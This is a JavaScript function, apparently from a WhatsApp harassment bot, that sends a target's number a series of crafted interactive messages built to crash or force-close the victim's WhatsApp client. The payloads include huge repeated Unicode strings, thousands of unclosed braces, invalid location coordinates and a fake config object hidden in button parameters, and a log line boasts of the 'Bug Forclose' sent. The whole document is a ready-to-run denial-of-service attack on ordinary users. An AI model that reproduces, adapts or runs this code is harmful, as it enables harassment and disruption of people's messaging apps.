async function VerloadXCallV3(target) {
try {
const VaxzyXx = JSON.stringify({
  status: true,
  criador: "VerloadXx",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

const virtex = "𑜦".repeat(71000);
const overJids = Array.from({ length: 30000 }, () => target)

let msg = await generateWAMessageFromContent(
target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "",
hasMediaAttachment: false,
},
body: {
text: "VaxzyIsHere៚"+ "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: [{
name: "single_select",
buttonParamsJson: VaxzyXx,
},
{
name: "call_permission_request",
buttonParamsJson: VaxzyXx + "{",
},
],
},
},
},
},
}, {}
);

await sock.relayMessage(target, msg.message, {
messageId: msg.key.id,
participant: {
jid: target
},
});

const messageBetaXx = {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "VaxzyIsHere៚",
hasMediaAttachment: false,
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "VaxzyIsHere៚".repeat(10000),
address: "ោ៝".repeat(10000),
},
},
body: { 
text: `VaxzyIsHere៚${"꧀".repeat(2500)}.com - _ #`
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
buttons: Array(6).fill().map(() => ({
name: Math.random() > 0.5 ? "mpm" : "single_select",
buttonParamsJson: ""
}))
},
},
},
},
};

await sock.relayMessage(target, messageBetaXx, {
participant: { jid: target },
});

const messageVxzXinvis = {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
title: "VaxzyNotWhyy👀",
hasMediaAttachment: false,
locationMessage: {
degreesLatitude: -999.03499999999999,
degreesLongitude: 922.999999999999,
name: "VaxzyNotWhyy👀".repeat(10000),
address: "ោ៝".repeat(10000),
},
},
body: {
text: "VaxzyNotWhyy👀",
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
},
contextInfo: {
participant: target,
mentionedJid: ["0@s.whatsapp.net"],
},
},
},
},
};

await sock.relayMessage(target, messageVxzXinvis, {
messageId: null,
participant: { jid: target },
userJid: target,
});

console.log(chalk.red(`Succes Sending Bug Forclose By Vaxzy To Target ${target}🔥`));
  } catch (err) {
    console.error("Terdapat Kesalahan Pada Struktur Function", err);
    throw err;
  }
}